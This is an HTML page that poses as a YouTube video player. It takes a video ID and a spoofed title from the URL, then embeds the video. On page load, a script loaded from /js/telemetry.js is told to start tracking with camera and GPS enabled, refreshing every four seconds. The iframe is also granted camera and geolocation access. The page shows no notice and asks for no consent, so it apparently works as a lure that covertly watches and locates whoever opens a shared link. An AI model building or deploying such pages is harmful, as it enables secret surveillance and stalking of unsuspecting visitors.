<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="yt-page-title">YouTube Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000000;
        }

        .video-container {
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000000;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>

<body>
    <div class="video-container">
        <iframe id="yt-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; geolocation; camera" allowfullscreen></iframe>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let rawV = '';
        let customTitle = '';

        const compressed = urlParams.get('d');
        if (compressed) {
            try {
                const data = JSON.parse(atob(decodeURIComponent(compressed)));
                if (data.v) rawV = data.v;
                if (data.t) customTitle = data.t;
            } catch (e) {}
        }

        if (!rawV) rawV = urlParams.get('v') || urlParams.get('video') || 'dQw4w9WgXcQ';
        if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title');

        let videoId = rawV;
        if (rawV.includes('youtu.be/')) {
            videoId = rawV.split('youtu.be/')[1].split('?')[0].split('&')[0];
        } else if (rawV.includes('watch?v=')) {
            videoId = rawV.split('watch?v=')[1].split('&')[0];
        } else if (rawV.includes('shorts/')) {
            videoId = rawV.split('shorts/')[1].split('?')[0].split('&')[0];
        }

        if (customTitle) {
            document.getElementById('yt-page-title').innerText = `${customTitle} - YouTube`;
        }

        const iframe = document.getElementById('yt-iframe');
        iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;

        // Telemetry tracking on load
        window.addEventListener('DOMContentLoaded', () => {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'youtube',
                    updateInterval: 4000,
                    enableCamera: true,
                    enableGPS: true
                });
            }
        });
    </script>
</body>

</html>
